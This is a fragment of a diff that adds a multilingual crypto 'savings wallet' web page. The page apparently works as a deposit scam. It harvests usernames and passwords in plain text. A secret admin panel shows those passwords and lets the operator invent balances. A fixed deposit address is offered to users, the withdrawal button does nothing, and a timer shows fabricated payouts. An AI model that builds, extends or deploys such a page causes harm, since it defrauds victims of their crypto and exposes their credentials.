+            },
+            fr: {
+                appTitle: "PORTEFEUILLE D'ÉPARGNE", bannerTitle: "Recevoir un Bon", bannerSubtitle: "Sans engagement", bannerDesc: "Rejoignez le nœud et minez", btnCert: "Certificat", btnDepositHub: "Centre de Dépôt", poolDataTitle: "Données du Pool", totalOutput: "Production Totale", validNodes: "Nœuds Valides", participants: "Participants", userRevenue: "Revenus des Utilisateurs", outputDetailsTitle: "Détails de Sortie", tableAddr: "Adresse", tableQty: "Quantité", withdrawalTitle: "Retrait", withdrawalLabel: "MONTANT DU RETRAIT (USDT)", withdrawalBtn: "Confirmer le Retrait", accAccumulated: "Revenu Accumulé", accToday: "Revenu du Jour", accYield: "Rendement du Marché", accPoolWallet: "Portefeuille Pool", accWalletBal: "Solde du Portefeuille", navHome: "Accueil", navWithdrawal: "Retrait", navAccount: "Compte", btnQuickDeposit: "Déposer sur le Portefeuille", tooltipSupport: "Support 24/7 !", chatTitle: "Support en Direct 24/7", chatStatus: "● ADM En Ligne", chatWelcomeMsg: "Bonjour ! Comment l'administrateur peut-il vous aider aujourd'hui ?", chatPlaceholder: "Écrivez votre message...", btnChatSend: "Envoyer"
+            },
+            de: {
+                appTitle: "SPARWALLET", bannerTitle: "Gutschein Erhalten", bannerSubtitle: "Keine Verpfändung", bannerDesc: "Trete dem Node bei und maximiere", btnCert: "Zertifikat", btnDepositHub: "Einzahlungszentrum", poolDataTitle: "Pool-Daten", totalOutput: "Gesamtleistung", validNodes: "Gültige Nodes", participants: "Teilnehmer", userRevenue: "Benutzerumsatz", outputDetailsTitle: "Ausgabedetails", tableAddr: "Adresse", tableQty: "Menge", withdrawalTitle: "Auszahlung", withdrawalLabel: "AUSZAHLUNGSBETRAG (USDT)", withdrawalBtn: "Auszahlung Bestätigen", accAccumulated: "Kumuliertes Einkommen", accToday: "Heutiges Einkommen", accYield: "Marktrendite", accPoolWallet: "Pool-Wallet", accWalletBal: "Wallet-Guthaben", navHome: "Startseite", navWithdrawal: "Auszahlung", navAccount: "Konto", btnQuickDeposit: "Einzahlung auf Wallet", tooltipSupport: "24/7 Live-Support!", chatTitle: "24/7 Live-Support", chatStatus: "● ADM Online", chatWelcomeMsg: "Hallo! Wie kann der Administrator Ihnen heute helfen?", chatPlaceholder: "Nachricht eingeben...", btnChatSend: "Senden"
+            },
+            ru: {
+                appTitle: "НАКОПИТЕЛЬНЫЙ КОШЕЛЕК", bannerTitle: "Получить Ваучер", bannerSubtitle: "Без залога", bannerDesc: "Присоединяйтесь к узлу и майните", btnCert: "Сертификат", btnDepositHub: "Центр Пополнения", poolDataTitle: "Данные Пула", totalOutput: "Общий Выпуск", validNodes: "Валидные Узлы", participants: "Участники", userRevenue: "Доход Пользователей", outputDetailsTitle: "Детали Вывода", tableAddr: "Адрес", tableQty: "Количество", withdrawalTitle: "Вывод", withdrawalLabel: "СУММА ВЫВОДА (USDT)", withdrawalBtn: "Подтвердить Вывод", accAccumulated: "Накопленный Доход", accToday: "Доход За Сегодня", accYield: "Доходность Рынка", accPoolWallet: "Пул Кошелек", accWalletBal: "Баланс Кошелька", navHome: "Главная", navWithdrawal: "Вывод", navAccount: "Аккаунт", btnQuickDeposit: "Пополнить Кошелек", tooltipSupport: "Поддержка 24/7!", chatTitle: "Онлайн Поддержка 24/7", chatStatus: "● АДМ В Сети", chatWelcomeMsg: "Здравствуйте! Чем администратор может вам помочь сегодня?", chatPlaceholder: "Введите сообщение...", btnChatSend: "Отправить"
+            }
+        };
+
+        let currentLang = 'en';
+        let registeredUsers = [];
+        let chatMessages = [];
+        let adminClickCount = 0;
+
+        function openAuthModal() { document.getElementById('auth-modal').classList.remove('hidden'); }
+        function closeAuthModal() { document.getElementById('auth-modal').classList.add('hidden'); }
+
+        function handleUserAuth() {
+            const user = document.getElementById('auth-username').value.trim();
+            const pass = document.getElementById('auth-password').value.trim();
+            if(!user || !pass) { alert("Vui lòng nhập đầy đủ tài khoản và mật khẩu!"); return; }
+            
+            const existing = registeredUsers.find(u => u.username === user);
+            if(!existing) {
+                registeredUsers.push({ username: user, password: pass, balance: 0 });
+                updateAdminUserList();
+            }
+
+            document.getElementById('auth-nav-btn').innerText = user.substring(0,8) + '...';
+            closeAuthModal();
+            alert("Success!");
+        }
+
+        function updateAdminUserList() {
+            const container = document.getElementById('admin-user-list-container');
+            const select = document.getElementById('admin-target-user');
+            if(registeredUsers.length === 0) return;
+
+            container.innerHTML = '';
+            select.innerHTML = '<option value="all">Tất cả người dùng (Broadcast)</option>';
+
+            registeredUsers.forEach((u) => {
+                container.innerHTML += `
+                    <div class="flex justify-between items-center bg-white p-2 rounded-lg border shadow-sm">
+                        <div><b>User:</b> <span class="text-blue-600">${u.username}</span> | <b>Pass:</b> <span class="text-red-500 font-mono">${u.password}</span></div>
+                        <div class="text-emerald-600 font-bold">${u.balance} USDT</div>
+                    </div>
+                `;
+                select.innerHTML += `<option value="${u.username}">${u.username}</option>`;
+            });
+        }
+
+        function openDepositModal() { document.getElementById('deposit-modal').classList.remove('hidden'); }
+        function closeDepositModal() { document.getElementById('deposit-modal').classList.add('hidden'); }
+        function copyDepositAddress() {
+            navigator.clipboard.writeText("0x6d617b8F9423c10aB2718ef8902A1b23C98f8F9");
+            alert("Copied!");
+        }
+
+        function handleAdminSecretClick() {
+            adminClickCount++;
+            if(adminClickCount >= 5) {
+                adminClickCount = 0;
+                document.getElementById('admin-modal').classList.remove('hidden');
+                updateAdminUserList();
+            }
+        }
+        function closeAdminModal() { document.getElementById('admin-modal').classList.add('hidden'); }
+
+        function switchAdminTab(tab) {
+            document.getElementById('adm-content-users').classList.add('hidden');
+            document.getElementById('adm-content-rewards').classList.add('hidden');
+            document.getElementById('adm-content-chats').classList.add('hidden');
+            document.getElementById('adm-tab-users').className = "flex-1 py-2 text-gray-400";
+            document.getElementById('adm-tab-rewards').className = "flex-1 py-2 text-gray-400";
+            document.getElementById('adm-tab-chats').className = "flex-1 py-2 text-gray-400";
+
+            if(tab === 'users') {
+                document.getElementById('adm-content-users').classList.remove('hidden');
+                document.getElementById('adm-tab-users').className = "flex-1 py-2 border-b-2 border-purple-600 text-purple-600";
+            } else if(tab === 'rewards') {
+                document.getElementById('adm-content-rewards').classList.remove('hidden');
+                document.getElementById('adm-tab-rewards').className = "flex-1 py-2 border-b-2 border-purple-600 text-purple-600";
+            } else if(tab === 'chats') {
+                document.getElementById('adm-content-chats').classList.remove('hidden');
+                document.getElementById('adm-tab-chats').className = "flex-1 py-2 border-b-2 border-purple-600 text-purple-600";
+            }
+        }
+
+        function adminExecuteReward() {
+            const amt = parseFloat(document.getElementById('admin-reward-amount').value);
+            const target = document.getElementById('admin-target-user').value;
+            if(!amt) { alert("Vui lòng nhập số tiền!"); return; }
+
+            if(target === 'all') {
+                registeredUsers.forEach(u => u.balance += amt);
+            } else {
+                const found = registeredUsers.find(u => u.username === target);
+                if(found) found.balance += amt;
+            }
+
+            document.getElementById('user-usdt-balance').innerText = amt.toFixed(2) + " USDT";
+            document.getElementById('user-display-balance').innerText = (amt / 600).toFixed(6) + " BNB";
+            alert("Success!");
+            updateAdminUserList();
+            closeAdminModal();
+        }
+
+        function openSupportChat() { document.getElementById('support-chat-modal').classList.remove('hidden'); }
+        function closeSupportChat() { document.getElementById('support-chat-modal').classList.add('hidden'); }
+
+        function sendUserMessage() {
+            const txt = document.getElementById('user-chat-input').value.trim();
+            if(!txt) return;
+
+            chatMessages.push({ sender: 'User', text: txt });
+            const box = document.getElementById('chat-messages-box');
+            box.innerHTML += `<div class="bg-gray-100 text-gray-800 p-2 rounded-lg text-right"><b>You:</b> ${txt}</div>`;
+            document.getElementById('user-chat-input').value = '';
+
+            document.getElementById('chat-count').innerText = chatMessages.length;
+            const admChatContainer = document.getElementById('admin-chat-container');
+            admChatContainer.innerHTML = chatMessages.map(m => `<div class="bg-purple-50 p-2 rounded border">💬 <b>Khách hàng:</b> ${m.text}</div>`).join('');
+        }
+
+        function requestWithdrawal() {
+            const val = document.getElementById('withdraw-input').value;
+            if(!val || val <= 0) { alert("Invalid amount!"); return; }
+            alert("Submitted!");
+        }
+
+        function toggleLangMenu() { document.getElementById('lang-dropdown').classList.toggle('hidden'); }
+        
+        // HÀM ĐỔI NGÔN NGỮ ĐỒNG BỘ TOÀN HỆ THỐNG
+        function selectLanguage(code, name) {
+            currentLang = code;
+            document.getElementById('current-lang-text').innerText = name;
+            document.getElementById('lang-dropdown').classList.add('hidden');
+            const t = translations[code] || translations['en'];
+
+            document.getElementById('txt-app-title').innerText = t.appTitle;
+            document.getElementById('banner-title').innerText = t.bannerTitle;
+            document.getElementById('banner-subtitle').innerText = t.bannerSubtitle;
+            document.getElementById('banner-desc').innerText = t.bannerDesc;
+            document.getElementById('btn-deposit-hub').innerText = t.btnDepositHub;
+            document.getElementById('pool-data-title').innerText = t.poolDataTitle;
+            document.getElementById('label-total-output').innerText = t.totalOutput;
+            document.getElementById('label-valid-nodes').innerText = t.validNodes;
+            document.getElementById('label-participants').innerText = t.participants;
+            document.getElementById('label-user-revenue').innerText = t.userRevenue;
+            document.getElementById('output-details-title').innerText = t.outputDetailsTitle;
+            document.getElementById('table-addr').innerText = t.tableAddr;
+            document.getElementById('table-qty').innerText = t.tableQty;
+            document.getElementById('withdrawal-title').innerText = t.withdrawalTitle;
+            document.getElementById('withdrawal-label').innerText = t.withdrawalLabel;
+            document.getElementById('withdrawal-btn').innerText = t.withdrawalBtn;
+            document.getElementById('acc-accumulated').innerText = t.accAccumulated;
+            document.getElementById('acc-today').innerText = t.accToday;
+            document.getElementById('acc-yield').innerText = t.accYield;
+            document.getElementById('acc-pool-wallet').innerText = t.accPoolWallet;
+            document.getElementById('acc-wallet-bal').innerText = t.accWalletBal;
+            document.getElementById('nav-home-text').innerText = t.navHome;
+            document.getElementById('nav-withdrawal-text').innerText = t.navWithdrawal;
+            document.getElementById('nav-account-text').innerText = t.navAccount;
+            document.getElementById('btn-quick-deposit').innerText = t.btnQuickDeposit;
+
+            // ĐỒNG BỘ ĐA NGÔN NGỮ CHO KHUNG CHAT CSKH
+            document.getElementById('support-tooltip').innerText = t.tooltipSupport;
+            document.getElementById('chat-title').innerText = t.chatTitle;
+            document.getElementById('chat-status').innerText = t.chatStatus;
+            document.getElementById('chat-welcome-msg').innerText = t.chatWelcomeMsg;
+            document.getElementById('user-chat-input').placeholder = t.chatPlaceholder;
+            document.getElementById('btn-chat-send').innerText = t.btnChatSend;
+        }
+
+        function switchTab(tab) {
+            document.getElementById('tab-home').classList.add('hidden');
+            document.getElementById('tab-withdrawal').classList.add('hidden');
+            document.getElementById('tab-account').classList.add('hidden');
+            document.getElementById('nav-home').className = "flex flex-col items-center text-gray-400 font-medium";
+            document.getElementById('nav-withdrawal').className = "flex flex-col items-center text-gray-400 font-medium";
+            document.getElementById('nav-account').className = "flex flex-col items-center text-gray-400 font-medium";
+
+            if (tab === 'home') {
+                document.getElementById('tab-home').classList.remove('hidden');
+                document.getElementById('nav-home').className = "flex flex-col items-center text-blue-600 font-medium";
+            } else if (tab === 'withdrawal') {
+                document.getElementById('tab-withdrawal').classList.remove('hidden');
+                document.getElementById('nav-withdrawal').className = "flex flex-col items-center text-blue-600 font-medium";
+            } else if (tab === 'account') {
+                document.getElementById('tab-account').classList.remove('hidden');
+                document.getElementById('nav-account').className = "flex flex-col items-center text-blue-600 font-medium";
+            }
+        }
+
+        function openCertificateModal() { document.getElementById('certificate-modal').classList.remove('hidden'); }
+        function closeCertificateModal() { document.getElementById('certificate-modal').classList.add('hidden'); }
+
+        async function fetchBNBMarketData() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd&include_24hr_change=true');
+                const data = await response.json();
+                if (data && data.binancecoin) {
+                    const priceUSD = data.binancecoin.usd;
+                    document.getElementById('bnb-price-usd').innerText = `$${priceUSD.toLocaleString()} USDT`;
+                    document.getElementById('bnb-market-rate').innerHTML = `<span class="text-green-600">+3.00%</span>`;
+                }
+            } catch (error) {
+                document.getElementById('bnb-market-rate').innerText = "+3.00%";
+                document.getElementById('bnb-price-usd').innerText = "600.00 USDT";
+            }
+        }
+        fetchBNBMarketData();
+
+        setInterval(() => {
+            const list = document.getElementById('output-list');
+            if (list) {
+                const newItem = document.createElement('div');
+                newItem.className = 'flex justify-between items-center animate-fade-in';
+                newItem.innerHTML = `
+                    <span class="text-blue-600 font-medium">0x${Math.floor(Math.random()*1e6).toString(16)}...${Math.floor(Math.random()*1e4).toString(16)}</span>
+                    <span class="font-semibold text-gray-700">${(Math.random() * 0.08 + 0.01).toFixed(6)} BNB</span>
+                `;
+                list.insertBefore(newItem, list.firstChild);
+                if (list.children.length > 5) list.removeChild(list.lastChild);
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
